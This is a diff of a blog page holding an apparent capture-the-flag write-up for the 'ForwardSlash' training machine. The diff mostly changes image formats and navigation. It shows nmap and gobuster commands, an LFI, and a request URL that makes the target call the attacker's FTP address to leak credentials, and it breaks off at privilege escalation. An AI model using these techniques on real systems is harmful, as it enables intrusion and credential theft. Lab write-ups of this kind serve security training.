@@ -1360,8 +1360,8 @@
 <meta property="og:description" content="OS: Linux | Level: Hard | Creators: InfoSecJack &amp; chivato | Released: April 4th, 2020 | Retired: July 4th, 2020 | Difficulty: 6.3/10 | Appreciation: 3.8/5">
 
   
-    <meta property="og:image" content="https://noobintheshell.com/images/htb_forwardslash/header.jpg">
-    <meta property="og:image:url" content="https://noobintheshell.com/images/htb_forwardslash/header.jpg">
+    <meta property="og:image" content="https://noobintheshell.com/images/htb_forwardslash/header.webp">
+    <meta property="og:image:url" content="https://noobintheshell.com/images/htb_forwardslash/header.webp">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="noobintheshell :: blog">
     <meta property="twitter:title" content="Hack The Box :: ForwardSlash">
@@ -1397,7 +1397,7 @@
     "url" : "https://noobintheshell.com/posts/htb_forwardslash/",
     "description": "OS: Linux | Level: Hard | Creators: InfoSecJack \u0026 chivato | Released: April 4th, 2020 | Retired: July 4th, 2020 | Difficulty: 6.3/10 | Appreciation: 3.8/5",
     "keywords": ["lfi","xxe","xss","luks"],
-    "image" : "https://noobintheshell.com/images/htb_forwardslash/header.jpg",
+    "image" : "https://noobintheshell.com/images/htb_forwardslash/header.webp",
     "author": {
       "@type": "Person",
       "name": "noobintheshell"
@@ -1524,6 +1524,18 @@
       
       
     
+      
+      
+      
+      
+
+      
+        <li class="navbarm__menu--item ">
+          <a href="/tags">Tags</a>
+        </li>
+      
+      
+    
 
     
       <li class="navbarm__menu--item ">
@@ -1587,6 +1599,14 @@
   
   
   <a href="/archive" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Archive</a>
+  
+  
+  
+  
+  
+  
+  
+  <a href="/tags" class="navbar__menu-item navbar__slide-down " dir="ltr" data-ani="true">Tags</a>
   
   
   <div class="show-search">
@@ -1703,7 +1723,7 @@
 
 
   <div class="featured-image__wrapper">
-    <img src="/images/htb_forwardslash/header.jpg" alt="Featured Image" class="featured-image" style="width: ;height: ;">
+    <img src="/images/htb_forwardslash/header.webp" alt="Featured Image" class="featured-image" style="width: ;height: ;">
   </div>
 <br />
 <a href="https://www.hackthebox.eu/home/machines/profile/239">ForwardSlash</a> is a <em>Hard Linux</em> box created by <a href="https://www.hackthebox.eu/home/users/profile/52045">InfoSecJack</a> and <a href="https://www.hackthebox.eu/home/users/profile/44614">chivato</a>. It was released on April 4th, 2020 and retired on July 4th, 2020. The users rated the difficulty 6.3/10 and gave an appreciation score of 3.8/5.</p>
@@ -1711,7 +1731,7 @@
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash01.jpg" alt="ForwardSlash Info Card" data-caption="ForwardSlash Info Card" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash01.webp" alt="ForwardSlash Info Card" data-caption="ForwardSlash Info Card" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1726,15 +1746,39 @@
     </figcaption>
   
 </figure>
+<hr />
 <h2 id="tldr">TL;DR</h2>
 <p>We access a website defaced by a hacker group. Checking for <em>VHOSTs</em>, we find a backup website with a login page. We can register and log in. The vulnerable feature has been poorly disabled as we can still call it to access a developer page that is protected by <em>IP</em> filtering. The feature is vulnerable to <em>LFI</em> and we can retrieve the pages source code with a <em>PHP</em> wrapper. The user <code>chiv</code> password is hardcoded in one of them. Once connected through <em>SSH</em>, we find multiples notes left by <code>chiv</code> that lead us to a backup config file that should contain the old database credentials. We exploit a <em>SUID</em> binary <code>backup</code> (owned by <code>pain</code>) to read that config file and retrieve <code>pain</code> password and therefore, the user flag. In <code>pain</code> home folder we find an encrypted file and the script used to encrypt it. We retrieve the encryption key with a dictionary attack. It message leaks the password of a <em>LUKS</em> image. <code>pain</code> is a sudoer and can run the commands to decrypt the image and mount it as <code>root</code>. The image contains <code>root</code> <em>SSH</em> private key that we use to get the root flag.</p>
+<hr />
 <h2 id="reconnaissance--enumeration">Reconnaissance &amp; Enumeration</h2>
 <h3 id="open-ports">Open Ports</h3>
 <p>An <em>NMAP</em> scan shows the following (partial) output:</p>
-<div class="box">$ sudo nmap -sS -sV -p- 10.10.10.183<br />
-PORT   STATE SERVICE VERSION<br />
-<strong>22</strong>/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />
-<strong>80</strong>/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</div>
+<div class="box"><p>$ sudo nmap -sS -sV -p- 10.10.10.183</p>
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE </th>
+<th>SERVICE </th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>22</strong>/tcp </td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</td>
+</tr>
+<tr>
+<td><strong>80</strong>/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.29 ((Ubuntu))</td>
+</tr>
+</tbody>
+</table>
+</div>
 <p>We discover the usual <em>SSH</em> server and <em>HTTP</em> ports opened.</p>
 <h3 id="web-discovery">Web discovery</h3>
 <p>Browsing the <em>IP</em> address redirects to <a href="http://forwardslash.htb"><code>http://forwardslash.htb</code></a>. We add the domain to the <code>/etc/hosts</code> file. We then access a website defaced by a hacker group called <em>The Backslash Gang</em>:</p>
@@ -1742,7 +1786,7 @@ PORT   STATE SERVICE VERSION<br />
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash02.jpg" alt="website landing page" data-caption="website landing page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash02.webp" alt="website landing page" data-caption="website landing page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1764,7 +1808,7 @@ PORT   STATE SERVICE VERSION<br />
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash03.jpg" alt="gobuster vhost -u http://forwardslash.htb/ -w ../../wordlists/big.txt | grep -E &#34;Status: (2|3)&#34;" data-caption="gobuster vhost -u http://forwardslash.htb/ -w ../../wordlists/big.txt | grep -E &#34;Status: (2|3)&#34;" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash03.webp" alt="gobuster vhost -u http://forwardslash.htb/ -w ../../wordlists/big.txt | grep -E &#34;Status: (2|3)&#34;" data-caption="gobuster vhost -u http://forwardslash.htb/ -w ../../wordlists/big.txt | grep -E &#34;Status: (2|3)&#34;" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1784,7 +1828,7 @@ PORT   STATE SERVICE VERSION<br />
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash04.jpg" alt="backup landing page" data-caption="backup landing page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash04.webp" alt="backup landing page" data-caption="backup landing page" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1804,7 +1848,7 @@ PORT   STATE SERVICE VERSION<br />
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash05.jpg" alt="http://backup.forwardslash.htb/welcome.php" data-caption="http://backup.forwardslash.htb/welcome.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash05.webp" alt="http://backup.forwardslash.htb/welcome.php" data-caption="http://backup.forwardslash.htb/welcome.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1824,7 +1868,7 @@ PORT   STATE SERVICE VERSION<br />
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash06.jpg" alt="quick message" data-caption="quick message" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash06.webp" alt="quick message" data-caption="quick message" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1844,7 +1888,7 @@ PORT   STATE SERVICE VERSION<br />
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash07.jpg" alt="http://backup.forwardslash.htb/profilepicture.php" data-caption="http://backup.forwardslash.htb/profilepicture.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash07.webp" alt="http://backup.forwardslash.htb/profilepicture.php" data-caption="http://backup.forwardslash.htb/profilepicture.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1876,13 +1920,14 @@ PORT   STATE SERVICE VERSION<br />
 <div class="box">403 Access Denied<br />
 Access Denied From 10.10.14.94</div>
 <p>It is probably only accessible from the localhost. We tried some well-known <em>HTTP</em> headers to bypass this kind of filter, but no success.</p>
+<hr />
 <h2 id="gaining-access">Gaining Access</h2>
 <p>We can easily edit the input and the button <em>HTML</em> code to remove the <code>disabled</code> attribute and then try to call <code>/dev/index.php</code> that will bypass the filter. This will include the <code>/dev/index.php</code> page:</p>
 <figure >
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash08.jpg" alt="include /dev/index.php" data-caption="include /dev/index.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash08.webp" alt="include /dev/index.php" data-caption="include /dev/index.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1910,7 +1955,7 @@ mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false</div>
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash09.jpg" alt="/dev/index.php snippet — credentials leak &#43; XXE" data-caption="/dev/index.php snippet — credentials leak &#43; XXE" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash09.webp" alt="/dev/index.php snippet — credentials leak &#43; XXE" data-caption="/dev/index.php snippet — credentials leak &#43; XXE" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1931,7 +1976,7 @@ mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false</div>
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash10.jpg" alt="/dev/index.php snippet — IP filtering" data-caption="/dev/index.php snippet — IP filtering" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash10.webp" alt="/dev/index.php snippet — IP filtering" data-caption="/dev/index.php snippet — IP filtering" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1956,6 +2001,7 @@ mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false</div>
 <div class="box"><a href="http://backup.forwardslash.htb/dev/index.php?xml=ftp://10.10.14.94/%22">http://backup.forwardslash.htb/dev/index.php?xml=ftp://10.10.14.94/&quot;</a></div>
 <p>The <code>&quot;</code> is important here to pass the regex filter.</p>
 <p>Anyway…the <em>FTP</em> credentials are re-used for the system user. We can log in through <em>SSH</em>.</p>
+<hr />
 <h2 id="local-reconnaissance--enumeration">Local Reconnaissance &amp; Enumeration</h2>
 <p>Now that we have a shell as <code>chiv</code> we can explore the box. The user flag is in <code>pain</code> home directory. We can read some more files in there. First, a <code>note.txt</code> from <code>chiv</code> that contains:</p>
 <div class="box"><p>Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key&hellip; I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.</p>
@@ -1973,7 +2019,7 @@ mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false</div>
   
   
   
-    <img data-src="/images/htb_forwardslash/forwardslash11.jpg" alt="/usr/bin/backup" data-caption="/usr/bin/backup" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
+    <img data-src="/images/htb_forwardslash/forwardslash11.webp" alt="/usr/bin/backup" data-caption="/usr/bin/backup" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
   
 
   
@@ -1994,6 +2040,7 @@ mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false</div>
 Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.</p>
 <p>-chiv</p>
 </div>
+<hr />
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 <h3 id="user-pivoting">User pivoting</h3>
 <p>We can copy the <code>backup</code> binary locally with <code>scp</code> and open it with <em>Ghidra</em>. The main function is quite self-explanatory:</p>
@@ -2001,7 +2048,7 @@ Anyway I am just leaving this note here to say that we still have that backup si
   
   
   
